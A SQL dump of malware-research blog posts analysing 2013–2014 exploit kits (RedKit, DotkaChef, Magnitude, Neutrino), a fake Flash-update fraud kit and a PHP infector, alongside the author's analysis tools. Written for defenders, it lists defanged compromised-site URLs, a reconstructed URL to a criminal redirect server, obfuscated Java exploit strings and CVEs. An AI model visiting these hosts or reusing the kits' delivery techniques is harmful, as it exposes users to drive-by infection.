google.com.\nBesides detecting these methods (or at the least captures the main parts and writes it out to the cleaned up output file for your review), the latest version of Pinpoint now includes several new features and bug fixes:\n\n Removed log option since that should always be enabled\n Added stats to log file (multiple calls will be counted each time)\n Included the HTTP request to the raw log file\n Ability to add to the header (use ^p to insert CRLF)\n Finds links on a webpage up to five levels deep\n Ability to access webpages when a port is specified (e.g. example.com:8080)\n Ability to make a GET or POST on the initial request\n Unescapes links before making a request to them\n\nHere’s a live example of Pinpoint doing its thing. (If you want to see more examples, you can read this introductory post.)\n\nYou can see an iframe tag with a strange-looking URL in the above pic. Viewing the log file reveals that this file has a high “entropy” value of 86.35% and is referenced on the main page.\n\nThe file called “pinpoint_clean.txt” is a cleaned-up version of the webpages that only shows key elements. Here you can see the malicious iframe tag.\n\nYou can download Pinpoint here.', 'drive-by download, exploit kit, pinpoint', 'http://www.kahusecurity.com/?p=13017\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (52, 'Revelo Updated', 'darryl', 'February 6, 2014', 'I’ve been noticing obfuscated Javascript using a function that returns the deobfuscated result more and more lately so I added a new method to catch this.\n\nHere’s an obfuscated script. It’s not that difficult but it does look intimidating!\n\nFirst I loaded the script and made sure that the “<script></script>” tags are present. This is important to Revelo because it uses this exact string as a marker to add content before or after the opening or closing script tag.\nNext, I click on the “Highlight Decryption Clues” button. This gives you hints to look for in the script — functions, variable accumulators, and now returns. What this shows is the variable “IBq” is accumulating a result. (This is the only accumulator in the entire script.) Then the results get returned to the calling function.\n\nJust choose the new method called “Intercept Return and Variable” and paste in the actual return statement “return(IBq)”. You need to paste the “return” keyword too because there’s other combinations.\n\nClick on the “Execute” button and go the Results tab to get the deobfuscated text. (Note: the results contain escaped characters but it is essentially deobfuscated.)\n\nThe other change was that I updated the JSBeautify script with the latest version from jsbeautifier.org .\nYou can find Revelo here.', 'obfuscated javascript, revelo', 'http://www.kahusecurity.com/?p=13002\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (53, 'Box.php Fraud Kit', 'darryl', 'January 30, 2014', 'I’ve been researching that fake Adobe Flash update and Neutrino EK redirect that other fine researchers have been writing about:\nblog.spiderlabs.com/2014/01/beware-bats-hide-in-your-jquery-.html\nblog.sucuri.net/2014/01/website-mesh-networks-distributing-malware.html\nwww.f-secure.com/weblog/archives/00002659.html\nblog.malwarebytes.org/online-security/2014/01/neutrino-delivers-fake-flash-malware-hosted-on-skydrive/\nI don’t want to duplicate too much of what they have already covered but here’s what I’ve discovered so far…\nCompromised websites have this script injected in HTML pages or external Javascript files (see SpiderLabs’ blog):\n\nHere are some other examples:\nv008642[.]home[.]net[.]pl/pub/ALwX12uL[.]php?id=56254554\nm1[.]home[.]pl/pub/pnrAtOjy[.]php?id=25916810\nwww[.]uacups[.]com/YZivZBZ8[.]php?id=18279488\ncrm[.]autotrim[.]ru/BgOXgTDu[.]php?id=53381973\nwww[.]luxuryholidaycottages-scotland[.]com/yQ0ofabY[.]php?id=19327629\n79[.]96[.]53[.]47/pub/KUnJWUSz[.]php?id=10665478\ntennesseechristmastree[.]org/z3vZkP8y[.]php?id=123805228\nbluemot[.]com/TRAVEL%20PASS%20PROYECTO%209%20JULIO_/PSV6HvQ8[.]php?id=10431893\nwww[.]dortmund-vegan[.]de/MyNHgdft[.]php?id=123562613\nsalvatorismater[.]home[.]pl/projekt/xUXpaFdw[.]php?id=55870772\nsvstall[.]at/CeXCJgtr[.]php?id=27970583\nwww[.]telecomdata[.]ro/qRdWb723[.]php?id=101043310\nwww[.]dvangelder[.]nl/AtGvHSaG[.]php?id=3792231\nbestwaytolearnmandarin[.]com/root/NdOmB5M7[.]php?id=60559313\nlaireduvin[.]fr/img/O2ApKvh4[.]php?id=60559313\nbluegrassfirstclass[.]com/Joseph/7vPt8Jm5[.]php\nwww[.]billingborough[.]lincs[.]sch[.]uk/attachments/4g3IIYEj[.]php?id=57110286\nheritageindiaimages[.]com/gallery_images/GILk7gke[.]php?id=63553146\nweb230[.]webgo24-server8[.]de/F1wxFBty[.]php?id=58237817\ncsfirearms[.]com/flash/6Is6c3hB[.]php?id=56543812\nsvp-stadt-sursee[.]ch/zVilDE4Z[.]php?id=51288531\npatchwerk[.]net/pics/fx9bLB38[.]php?id=115311343\nwww[.]alessiosatta[.]it/img/6QeiNof2[.]php?id=52484468\nkavelnieuws[.]nl/cgi-bin/yWqMkTiL[.]php?id=46362613\nwww[.]dvangelder[.]nl/AtGvHSaG[.]php?id=46626551\nwg2c7cfgx[.]homepage[.]t-online[.]de/kontakt/dw1sPuVj[.]php?id=58215025\nAfter a few moments, the visiting website shows a frame offering an Adobe Flash Player update.\n\nClicking on the link leads to a malicious executable being download. I’m not sure how successful this fraud campaign is but it looks pretty convincing to untrained users.\nThe landing page of that injected script sets up the fake Adobe Flash Player update frame then calls an external HTML file. You can see the reference to “b.html” in the HTML page below.\n\nSometime in mid-January, the landing page was updated to include a call to the Neutrino Exploit Kit. Now it seems to be redirecting to the Nuclear Exploit Kit.\n\nGoing back to the fake update, here’s a portion of the “b.html” page. The “skydrive.live.com” link is where the malware resides.\n\nAfter checking numerous sites for additional clues, I was lucky to find an open FTP server so I could download the files behind this campaign.\n\nThe HTML files are different pages that try to convince users to download VLC Player, VIO Player, to disable AdBlock, or to enable Javascript.\n\nThere are three PHP files. In the “b.html” file, there’s an AJAX call to “checker.php”. This PHP file grabs the visitor’s IP, presumably for banning repeat visitors and/or to check if it belongs to security companies or sandboxes.\n\nThe second file, “okaybox.php”, looks like this:\n\nAfter deobfuscating this, the script turns out to be WSO Shell with weird comments embedded in the script used as fillers.\n\nInterestingly, the individual(s) behind this “kit” often uses a PHP shell with a filename that starts with a four-letter dictionary word followed by “box.php” (e.g. agedbox.php, lonebox.php, pastbox.php, ripebox.php, etc.).\nThe third PHP file is what the compromised website redirects the users to and looks like this. The script has three parts. The top part has a “cfg” variable. The second part has an array of base64 strings. The third part is the main code that references the array.\n\nYou can use Converter’s Array Search/Replace function to deobfuscate this in such a way so you can see what it’s doing but not necessarily to run it (unless you fix the variables by adding quotes where applicable).\n\nWhat this script basically does is decrypt the “cfg” variable, make a request to some site and pass information about the user and server to it, then take some action depending on the results.\n\nYou can fix up the code so you can decrypt the “cfg” variable manually. Cool!\n\nNow we can mimic the script and see what happens. I constructed the URL based on the code (don’t visit this link if you don’t know what you’re doing!):\nhxxp://109.202.108 .4/mantds/egiybka.php?dom=http://www.somesite .com/&ref=http://www.othersite .com/&ip=10.10.10 .10&prox=no&agent=Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)\n\nThis is the same landing page we got at the very top of this article except the iframe source now references our fake site.', 'fraud, neutrino, nuclear, social engineering', 'http://www.kahusecurity.com/?p=12996\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (54, 'Sneaky Redirect to Exploit Kit', 'darryl', 'January 12, 2014', 'While I was testing a Pinpoint update, I found a sneaky method to redirect unsuspecting users to Neutrino EK. This one was interesting to me so I thought I would document it here.\nHere’s the website I visited…looks suspicious already:\n\nThere was a reference to an external Javascript file:\n\nThe file is obfuscated Javascript which is a red flag:\n\nI found the malicious redirect, or so I thought…\n\nLong story short, this led nowhere. Going back to the main page, there is a call to a Flash file at the bottom.\n\nReviewing the ActionScript reveals something interesting. It reads in a PNG file called “gray-bg.png”, extracts every other character, then evals it.\n\nThe “PNG file is not a graphic file but a renamed text file.\n\nI used Converter to extract one character every two positions and got this:\n\nThe URL leads to the Neutrino landing page.', 'actionscript, exploit kit, flash, neutrino', 'http://www.kahusecurity.com/?p=12973\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (55, 'Exploit Delivery Networks', 'darryl', 'January 9, 2014', 'Exploit packs are normally set up on a hacker-controlled server. Compromised websites or malicious email links lead unsuspecting users to the drive-by landing page on the server. While this keeps the main control panel, renter’s panel, crypter, statistics, etc all in one place, it’s vulnerable to a take-down resulting in a major disruption and a loss of statistical data among other things.\nWe might be seeing the beginning of a new trend where distributed, self-contained exploit packs are installed on multiple compromised websites. A back-end server pushes out updates to and retrieves statistics from these websites. Take-downs of these compromised websites hosting the exploit packs don’t cause a major disruption anymore. The hackers just compromise other websites and quickly build it back up.\nThis is basically a content delivery network but for exploits — an “Exploit Delivery Network”, if you will. RedKit is a prime example (you can read about it here). Another exploit pack was recently revealed which operates in a similar manner.\nSpecial thanks to a colleague of mine who provided me with intel and permission to write about this. Also thanks to a forum administrator who provided me with the files after his site was compromised.\nRamayana Exploit Pack\nThe “DotkaChef” exploit pack was discovered several months ago. Its real name is ramayana. Recently, the cybercriminals behind ramayana targeted numerous forums running vulnerable versions of IP.Board (read more here). After successfully exploiting the website, a folder is created with the self-contained exploit pack copied to it.\n\nThe PHP script verifies that the incoming URL contains the correct parameters and values otherwise you won’t get infected. This prevents researchers from trying to analyze the pack. Here’s an example exploit chain related to ramayana:\nwebsite/panel/js/fe0e2feefe/?=MDct5ibpFWbf12c8lzM1ATN4YDM1UDMwk\nzM89SZmVWZmJTZwUmZvMnavwWZuFGcvUGdpNnYld3LvoDc0RHa8NnZ\nwebsite/panel/js/fe0e2feefe/?f=a&k=3900550685053931\nwebsite/panel/js/fe0e2feefe/?f=s&k=3900550685053919\nwebsite/panel/js/fe0e2feefe/?f=sm_main.mp3&k=3900550685053942 \nHere’s the part of the script that sends the exploit over. There are two Java exploits used — atom.jar (CVE-2013-2423) and byte.jar (CVE-2013-1493).\n\nThe Java applets and their related payloads are the four other files you see in the folder screenshot above. Those files are base64-encoded and are decoded upon delivery.\n\nA stats file is also created which contains the key parameter from the URL and a status code.\n\nThe PHP script defines the values of the status code:\n\nThe backend system that controls the exploit pack nodes runs Python. It does a health check, builds the exploit pack files, pushes out updates, and other things. And of course there is a dashboard with a statistics panel which is fed by a stat-harvesting script. This appears to be an important measure of an exploit pack’s success and therefore part of most control panels.\nSummary\n“RedKit” and ramayana may represent a new class of exploit packs and an evolutionary improvement over their peers. Their exploitation methods remains the same but the delivery system uniquely leverages compromised websites to host disposable components of their exploit pack in order to maximize resiliency, protect their backend systems, and ultimately, to ensure the longevity of their criminal operations. Time will tell if Exploit Delivery Networks become the new norm but it’s something to keep a close eye on nonetheless.', 'DotCache, dotcachef, DotkaChef, exploit delivery network, ramayama, redkit', 'http://www.kahusecurity.com/?p=12965\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (56, 'The Resurrection of RedKit', 'darryl', 'January 7, 2014', '“RedKit” was once a thriving exploit pack then faded away leaving behind artifacts on several abandoned hosts which are still triggering broken redirection alerts to this day. Within the past couple of months, however, we are witnessing a deliberate return of “RedKit”. While I can’t be 100% certain, there are many striking similarities between this and the previous iteration of RedKit that I’m led to believe that this is an updated version.\nOverview of its Resilient Infrastructure\nRedKit, discovered in May 2012 by Trustwave, eventually built itself a three-tier infrastructure to protect its backend, “command and control” server. The real exploit pack server would send PHP scripts to compromised websites and gave them assigned roles: redirector, exploiter, and dropper.\n\nOriginally, a typical RedKit infection chain looked something like this:\n\nRedKit v2.0\nBack in November 2013, this was the malicious iframe tag that led unsuspecting visitors to a drive-by landing page:\n\nJoel Esler identified this as a new exploit kit and called it “Goon EK”. The infection chain looked like this:\n\nIt turns out that this was the first appearance of the updated version of RedKit. Then in early December 2013, RedKit v2.0 URLs looked very similar and instead of “cnt.php” it used “post.php”.\n\nThe infrastructure required one less tier of compromised hosts and looked something like this:\n\nNear the end of December 2013, the infrastructure and URLs changed once again. Now it’s more efficient and even less compromised hosts are needed. This is what the infrastructure looks like today:\n\nThis is what the redirection to the landing page looks like:\n\nAnd this is the infection chain:\n\nIf you’ve been tracking these infections, you’ll notice that the URLs to the exploit landing pages are very inconsistent. Here are several examples:\n\nHow are they able to achieve this? The RedKit author(s) are cleverly using the .htaccess rewrite rule so the malicious URLs can be anything they choose. The URLs they have used to date doesn’t have any pattern but the filename will always contain .php, .htm(l), or .asp(x).\nIf you go to a non-existing file on the compromised website, it will be caught by their script. The script then parses the URI and depending on the results, the appropriate exploits are delivered.\nTo check if a website has been compromised and part of a RedKit infrastructure, visit a non-existing file with a “.shtml” extension. If the .htaccess and malicious script exists, it will catch the URI and echo it back to you.\n\nRedKit v2.0 Arsenal\nRedKit uses one of three Java exploits depending on the version the user has installed. The Java applets have minimal obfuscation. It does have a hidden class file called “NewClass.class”. And as you can see, it builds the URL for the payload using the time (HHmmss) and then appends the string “.mp3”.\n\nIn late December, a new exploit, VUPEN’s Internet Explorer Use After Free Vulnerability, was added. The payload URL triggered by this IE exploit doesn’t use the timestamp method. It’s a hard-coded value in the exploit code.\n\nThe landing page containing the exploit code has been obfuscated. The script XORs the blob of characters using the value “cdlo” (first red rectangle). At the bottom, the script calls a function called “starter” which passes the payload URL and another XOR key which is then concatenated to a VBScript routine and executed. At the bottom, there’s a link to a malicious Java applet just in case the IE exploit failed.\n\nHere are the exploits used by this version of RedKit:\n\nRedKit Infrastructure\nThe compromised servers hosting the RedKit script has an .htaccess file which causes all non-existing files to redirect to the “post.php” file. I was able to obtain these files by a helpful website developer.\n\nThe post.php file is different depending on the website’s role and can be easily and quickly changed by the author(s). In fact, the author(s) appear to rotate the roles regularly to avoid detection. The PHP script is minimally obfuscated and looks like this:\n\nRedirector Role – Back in November 2013, the compromised websites playing the redirector role checked for the “id” parameter, wrote the IP address to a file called “post.ips”, then redirected the visitor to the next stage. It did check to make sure they were potentially vulnerable Windows machines as you can see here.\n\nExploiter/Dropper Role – The websites with this role have a different post.php file. The script doesn’t interrogate the visitors’ Referer and UserAgent as thoroughly as in the past. It does check what version of Java they are running then gives them the IE exploit or one of three malicious Java applets.\nFirst, it makes sure the URI contains “.php”, “.htm”, or “.asp” then it writes the IP address to a file. It then does a basic check to make sure the Referer and UserAgent exists and has a long enough value. Then it produces the IE exploit landing page or the following HTML page for the Java applets:\n\nThe visitor is then redirected to a non-existent file on the same server but is caught by the .htaccess rewrite rule and sent back to the post.php file. Here, the script checks the Java version and gives the visitor the appropriate JNLP and Java files. The Java URL again leads the visitor back to the post.php file and the applet is delivered. All of the files are stored within the PHP script as base64-encoded strings which are decoded as needed.\n\nA log of visitors is written to a text file on the website which is grabbed by the RedKit author(s) then cleared each time:', 'drive-by, exploit kit, goon, goon ek, redkit', 'http://www.kahusecurity.com/?p=12960\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (57, 'Pinpoint Tool Released', 'darryl', 'January 2, 2014', 'There are many times where I come across a drive-by download, especially malvertisements, and it takes me awhile to figure out which file on the compromised website is infected. I wrote Pinpoint to help me find the malicious objects faster so I can provide that info to webmasters for clean-up purposes. My hope is that this tool will be helpful to you as well.\n\nPinpoint works like wget/curl in that it just fetches a webpage without rendering any script. Pinpoint will then try to determine which links are used to make up the webpage such as Javascript, CSS, frames, and iframes and downloads those files too (some Javascript content will produce incorrect links). The list of links it finds shows up in the document tree on the main window.\nAt the same time, a log file is created which shows the links and in which file the link resided in. It will also download the file and calculate the “entropy”; the higher the value, the more rubbish characters it found which may help identify obfuscated Javascript.\nYou can of course spoof the user-agent string and referer values to ilicit a malicious response from the website. There’s also a function to clear your cookies (see Options menu item) since many exploit packs check for the presence of cookies on repeated visits. Use Tor to get another IP address since it’ll get banned usually after the first visit.\nHere are a few examples to help you better understand what this program does.\nExample #1\nVisiting the website in the screenshot below with the appropriate user-agent and referer values reveals a suspicious-looking iframe.\n\nOpening log.txt shows the files that make up the webpage. The second URL from the top looks suspicious and has a 51% entropy value which is not really high but may indicate the presense of some obfuscated Javascript.\n\nBy default, there are two other files that are created. The capture.txt contains the HTML source code of all of the pages it fetched. You can see the main webpage and somewhere in there is the malicious iframe. Under that is the HTML source code of the iframed page.\nWhile your computer is safe since none of the scripts are executed, your anti-virus may still detect malicious scripts and trigger an alert (and blacklist my Pinpoint program in the process). Ideally you should be doing all of this in a virtual machine without AV anyway.\n\nThe second file that gets created is clean.txt which is a cleaned up version of the HTML source code that just contains Javascript, frame, iframe, calls to external scripts, etc. This should help you locate the malicious content faster. Unfortunately, you may still have to figure out where in the source code the malicious content is.\n\nExample #2\nAnother infected website is visited and it shows two suspicious links — one in the external Javascript section and the second in the iframe section.\n\nHere’s the log file that shows several things. First the presence of the external Javascript file about half-way down. The second is the last file with a weird URL. The entropy value is very high for this one which means this is likely heavily obfuscated (or packed/compressed).\nThe request chain reveals that the main page called up the external Javascript file and that file called up the iframe.\n\nHere’s the capture file which shows that iframe page with the entropy value of 86.48%.\n\nAnd here’s the clean file showing the external Javascript file. By the way, I made everything left-justified in this file to make it quickly readable.\n\nExample #3\nHere’s the last example. This one doesn’t show anything in the document tree because there’s no links on the page.\n\nThe log file shows content with a relatively high amount of entropy.\n\nThe capture file shows obfuscated Javascript appended to legitimate webpage contents.\n\nFinally, the clean file shows the important bits.\n\nMost of the options don’t need any explanation but here’s a brief description of those that do:\nDisable Compression – sends the HTTP request without the encoding option\nEnable Entropy – performs the entropy check\nIgnore Safe Sites – ignores common sites that host frameworks, ads, and other legitimate content so it doesn’t get downloaded\nIgnore CSS – ignores external CSS files so that it doesn’t get downloaded\nWhen visiting a large website full of links, AJAX calls, and embedded content, Pinpoint may choke on it. I’ll explore other methods but for now this seems to work fine most of the time. You can find the tool here.', 'drive-by download, pinpoint, website compromise', 'http://www.kahusecurity.com/?p=12938\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (58, 'Analyzing DotkaChef Exploit Pack', 'darryl', 'December 19, 2013', '“DotkaChef” (aka DotCache, DotCacheF) was discovered by Chris Wakelin (@EKwatcher) several months ago. Today we noticed that several things have changed but it’s functionally the same.\nIf you look closely at the websites infecting visitors’ computers linked to “DotkaChef”, they are running Invision Power Board (IP.Board). It’s quite possible that cybercriminals have been targeting a vulnerability in old installations of IP.Board, specifically versions <= 3.3.4 (CVE-2012-5692 - Unserialized PHP Code Execution).\n\nWhen a website is successfully compromised, the “DotkaChef” Pack gets uploaded to the server in one folder with random characters. This appears to be a self-contained, portable exploit pack.\nBack in June or so, the URLs looked like this (and thus its name):\nwebsite/upload/.cache/?f=atom.jar&k=2341993693027637&h=baf5291d12f88f53\nwebsite/upload/.cache/?f=site.jar&k=2341993693027615&h=baf5291d12f88f53\nwebsite/upload/.cache/?f=sm_main.mp3&k=2341993693027648&h=baf5291d12f88f53\nSince then, the URL formats have changed and no longer use the “/.cache/” folder.\nwebsite/panel/js/fe0e2feefe/?=MDct5ibpFWbf12c8lzM1ATN4YDM1UDMwk zM89SZmVWZmJTZwUmZvMnavwWZuFGcvUGdpNnYld3LvoDc0RHa8NnZ\nwebsite/panel/js/fe0e2feefe/?f=a&k=3900550685053931\nwebsite/panel/js/fe0e2feefe/?f=s&k=3900550685053919\nwebsite/panel/js/fe0e2feefe/?f=sm_main.mp3&k=3900550685053942 \nLet’s have a closer look…\nThe URL for the landing page has a bunch of random characters. This is actually base64 characters in reverse. Reversing and de-base64’ing the string reveals the following.\nfs|http://website/panel/js/fe0e2feefe/|39005506850539|sm_main.mp3\nThe pipe character is used as a delimiter to separate out “fs”, the website path, a 14-digit “key”, and the payload. When the malicious URLs are generated, the “k” variable contains a 16-digit number with the 14-digit “key” as the base.\nThe “f” variable is associated with the malicious Java applet. This kit uses two Java exploits and the “a(tom.jar)” and “s(ite.jar)” values correspond to the exploit to be used.\nIf you were to hit the page with an incorrect URL, you will see this error message:\n\nWhen the correct URL is used, you will get the landing page. The landing page has Javascript which uses JJEncode for its obfuscation which you can see below (I wrote about how to deobfuscate this earlier):\n\nThe deobfuscated version looks like this. It’s calling up the “atom.jar” exploit which abuses CVE-2013-2423.\n\nUsing JD-GUI, we can see that there’s little in the way of obfuscation as it’s using base64 to convert its strings. It reads in the URL from the landing page and sends the payload to the computer.\n\nThe other Java applet is basically doing the same thing. This applet exploits CVE-2013-1493.\n\nThe payload comes down with the “mp3” file extension that gets renamed then executed. You will get one of two payloads – Zbot or Zaccess. \nFinally, the exploit pack keeps track of successful and unsuccessful loads. Each row contains the key, a pipe delimiter, and a status code. The status code of “466” indicates it was a successful load.\n\nBy reviewing the logs, there are quite a number of successful loads making this a simple yet effective exploit pack.\nFile: atom.jar (CVE-2013-2423)\nMD5: 36D157C2EE62CF4BABA43497983739AA\nVT: 3/49\nFile: site.jar (CVE-2013-1493)\nMD5: FDCF4174445C303FC20494D9B24D7E7D\nVT: 5/48\nFile: bb.mp3 (Zbot)\nMD5: 29028CB338DFA191574939D281F1B385\nVT: 24/47\nFile: sm_main.mp3 (Zaccess)\nMD5: B6B0F0FE2033608579B4FA55D2993486\nVT: 36/49', 'DotCache, dotcachef, DotkaChef, exploit kit, jjencode', 'http://www.kahusecurity.com/?p=12923\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (59, 'Wild Wild West – 12/2013', 'darryl', 'December 1, 2013', 'Added the following packs:\nWhite Lotus\nCK Exploit Kit\n“x2o Exploit Kit”\n“Angler Exploit Kit”\n“HiMan Exploit Kit”\n“Magnitude Exploit Kit”\nLightsOut Exploit Kit\n“Goon Exploit Kit”\nSpecial thanks to Kafeine for his feedback and numerous contributions!', 'exploit kit', 'http://www.kahusecurity.com/?p=12912\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (60, 'Deobfuscating Magnitude Exploit Kit', 'darryl', 'November 11, 2013', 'Per a couple of reader’s request, I’ll be covering how to deobfuscate Magnitude using the latest version of Converter. For those of you who don’t already know the history of Magnitude EK, you can catch up by checking out the following articles from two fine security researchers:\nMagnitude EK : Pop Pop\nOfficial PHP Website Hacked, Spreads Malware Infection\nFrom a source of mine, here’s what the panel looks like and a suggestion that a better name for this kit should be “Death Touch EK”. How appropriate for unpatched computers!\n\nThe exploits used by Magnitude/Death Touch EK are:\nCVE-2013-2551 (IE VML)\nCVE-2012-0507 (Java Atomic)\nCVE-2013-2471 (Java Raster)\nCVE-2011-3402 (EOT86/EOT64)\nHere’s the latest iteration of the Magnitude EK landing page which has changed since a few weeks ago:\n\nThe script splits the values using the “%” character and converts the decimal values to text before xor’ing it. You can simply write out the value of the variable “awt”. This is what you should do if you’re using Revelo:\n\nThis is the result. As you can see, several exploits are thrown at the computer.\n\nEventually, the computer will be infected with ransomware if any of the exploits were successful.\n\nLet’s focus on the Java applet which has very little coverage on VirusTotal.\nMD5: 31526a1411a85a3e8b9e7a614b4ba065\nVT: 1 / 47\n\nWhat you see above is the main string deobfuscator routine which is deXOR’ing with the value of 0x14. Strings from the “v.class” file look like this and are sent to the routine to be deobfuscated.\npublic static String jgrw = wiutc.n(“~ubu:uc`:}yusq:Pu`uVarrqf”);\npublic static String hdhkww = wiutc.n(“~ubu:uc`:}yusq:Pu`uVarrqfVm`q”);\npublic static String xrkzfj = wiutc.n(“~ubu:uc`:D{}z`”);\npublic static String rqp = wiutc.n(“~ubu:uc`:}yusq:Fug`qf”);\npublic static String mcitjzb = wiutc.n(“~ubu:uc`:Uxd|uW{yd{g}`q”);\npublic static String w = wiutc.n(“~ubu:uc`:}yusq:Yax`}D}lqxDuwqpGuydxqY{pqx”);\npublic static String dwnmvoh = wiutc.n(“~ubu:gqwaf}`m:Df{`qw`}{zP{yu}z”);\nYou can use Converter’s Key Search/Convert feature and paste in the string, set the values as you see in red and you can get the plain text value when you click on the “Convert” button at the bottom. Looks like this applet is exploiting CVE-2013-2471.\n\nIn the same “v.class” file is a large blob of weird-looking characters. The variable is passed to two functions. The first is the same routine as the above. The second function converts the result from base64 to binary.\n\nTo deobfuscate this blob of text, paste it into Converter then choose Format > Mixed Octal to Hex. You will get a bunch of hex code back.\n\nClick on “Copy Output to Input” to get the hex code to the top. Then click on Key Search/Convert and choose the following options. Make sure you choose the “hex” input this time. What you should get is Base64 characters.\n\nCopy the result back to Converter’s main screen then click on the “Base64 to Hex” button. The “CAFEBABE” string is the magic for Java class files.\n\nClick on the “Copy Output to Input” then click on File > Export Binary File and write it out to a file called “file.class”.\n\nNow you can open the file up with JD-GUI or whatever you use. You can see that it will try to disable the SecurityManager and another function converts the payload using XOR 0x29.\n\nLast month the applet was using a different method to obfuscate its strings. I’m not sure why they changed it since it was more sophisticated. Let’s have a look at that one.\nMD5: 31526a1411a85a3e8b9e7a614b4ba065\nVT: 4 / 47\n\nThe above routine deobfuscated the following strings:\npublic static String kpwieg = v.mw(“JNKNnNp5n.~NcFnEN5NU!jjF3UT5F”);\npublic static String omfoucd = v.mw(“JNKNnNp5n#9.t5”);\npublic static String ndzgu = v.mw(“JNKNnNp5n.~NcFn&NX5F3”);\npublic static String ugyu = v.mw(“JNKNnNp5n*AS,Nw9~S9X.5F”);\npublic static String mzjot = v.mw(“JNKNnNp5n.~NcFnw9A93197FA”);\npublic static String ekc = v.mw(“JNKNnNp5n.~NcFn1!A5.#.$FA#N+/F7uN~SAF197FA”);\npublic static String nqu = v.mw(“JNKNnANtcni=JF+5”);\nThe function “mw” would load the first obfuscated character, look it up in a string and find its position number then add 32 to the final decimal result. We can do the same using Converter.\nHere’s the deobfuscation key from the “v.class” file. We need to unescape this and keep the result handy.\n%I\\\\vz;0(8WbeD?nlfos:q_^@d\\”1Qi#G&u-CraV{)6MOyH[N=+7Fjc,.J/A~t9Sx3X5!Kp$T2km]g\nNow select an obfuscated string (unescape it first if necessary), paste it to Converter, then click on Tools > Secret Decoder Ring. Choose the following options and paste the deobfuscation key so it looks like this:\n\nClick on the “Decode” button and you should get a string of decimal values:\n\nWe’re not done yet. Copy the result and go to File > Key Search/Convert. Now choose the following settings and click on the “Convert” button.\n\nThis applet also has a large blob of obfuscated text.\n\nYou basically have repeat the same steps above but with some additional steps:\n\n Paste blob into Converter\n Convert “Mixed Octal to Hex”, “Hex Format – %”, then “Hex to Text” (cleans it up then converts back to text)\n Use Secret Decoder Ring\n Use Key Search/Convert to add 32 to the value\n\nYou should then have base64 characters left like so. If you noticed, you will have some colon characters in your result but these are not part of the standard base64 alphabet. Based on the Java code, we need to replace them with the letter “L”.\n\nThe final step is to convert this from “Base64 to Hex” and export it to a binary file. If all goes well you will be able to open the binary file as “rwnc.class”. By the way, this file looks the same as the one we got with the current version of Magnitude.\n\nI hope this walk-through was helpful to you!', 'converter, death touch, deobfuscation, exploit kit, java, magnitude, revelo', 'http://www.kahusecurity.com/?p=12909\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (61, 'Converted v0.10 Released', 'darryl', 'November 6, 2013', 'The latest version of Converter includes changes to the menus and several new features. You can download this version here.\nFilter Menu\n\nThere’s two new functions added to the menu. The first is “Strip Whitespace” which removes spaces, tabs, CRs, LFs, etc from your input. Thanks to TW for this request.\nThe second is called the “Position Filter”. With it you can extract characters with a fixed position or after a certain character. Here’s a quick example. There’s some base64 characters in between those junk characters. We can extract what we need using this position filter.\n\nFormat Menu\n\nUnder this menu, I’ve added a row numbering capability which will insert the row number starting at 0 or 1 at the beginning of each row.\nBeautify Generic is an option to quickly beautify your input using a quick and dirty method. The Beautify HTML and Beautify Javascript functions use the latest JSBeautifier.org scripts (full credit to them).\nStats Menu\n\nAll I’ve done here is move the MD5 Hash and SHA256 Hash functions to this menu.\nTools Menu\n\nTwo new functions have been added which was described in a previous blog post.\nOther Improvements and Fixes\nBesides the above new functions, there were several enhancements and fixes made. One change has been made to the “Base64 to Text”, “Base64 to Hex”, and “Convert Custom Base64” functions. It now does a check of the length of the input. If the input string is not divisible by four then the input string has too many characters or is likely missing the padding character(s). Thanks to JW for this request.\nThank you all for your continued support, ideas, and requests!', 'converter', 'http://www.kahusecurity.com/?p=12888\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (62, 'PHP Infector', 'darryl', 'October 12, 2013', 'A reader wanted me to analyze a PHP file that was found on his hacked WordPress site. The script is made up of three parts as you can see.\n\nThe top two sections contain an array of Base64-encoded strings. The bottom section references the arrays and performs the main functions.\nMy first thought was to replace each of the array variables with the actual decoded strings. Then I could read the script at the bottom and figure out what it’s doing. But replacing each of the variable names with the values from the array manually would be a pain! (Anyone got a better idea? If so, let me know.)\nWhenever I come across a problem, I try to find a generic solution that I can keep using in the future. Here’s what I came up with…\nFirst I take each of the top two sections and separate the encoded values by rows. So I take this:\n\nAnd use search/replace to make it look like this:\n\nThen I modified Converter to base64-decode each row separately:\n\nThen I replaced each row with a pipe delimiter (since it wasn’t being used anywhere):\n\nI did the same for the second section:\n\nI wrote a program that does a search and replace of the array values. I entered the search string that corresponded to the top section and pasted in the decoded strings with the pipe delimiter to get the result.\n\nThe second section was next.\n\nAll done! This script probably won’t execute properly because some of the strings need to be quoted but at least you can get a much better idea of what’s going on.\n\nBasically this downloads a file from a website, gets the URL and visits it. It essentially serves up a drive-by link to unsuspecting visitors.\n\nThe iframe link is the landing page of Sweet Orange. The link changes every couple of minutes or so.\nI’ll need to think about this more and see if there’s another generic solution. If not, I’ll add this method to Converter in the future.', 'converter, drive-by download, php script', 'http://www.kahusecurity.com/?p=12880\n');
